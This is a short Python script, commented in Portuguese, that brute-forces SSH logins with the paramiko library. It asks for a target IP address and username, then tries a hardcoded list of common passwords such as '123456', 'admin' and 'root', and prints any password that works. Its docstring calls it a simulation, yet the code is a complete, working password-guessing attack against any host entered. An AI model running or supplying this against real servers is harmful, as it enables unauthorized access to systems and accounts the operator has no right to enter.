import paramiko

def brute_force_ssh(ip, username, password_list):
    """Simula um ataque de força bruta contra SSH."""
    for password in password_list:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=password, timeout=2)
            
            print(f"[+] Senha encontrada: {password}")
            client.close()
            break
        except paramiko.AuthenticationException:
            print(f"[-] Tentativa falhou com senha: {password}")
        except Exception as e:
            print(f"[-] Erro na conexão: {e}")

if __name__ == "__main__":
    ip = input("Digite o endereço IP do alvo: ")
    usuario = input("Digite o nome de usuário: ")
    senha_lista = ["123456", "senha123", "admin", "root", "qwerty", "password"]

    brute_force_ssh(ip, usuario, senha_lista)
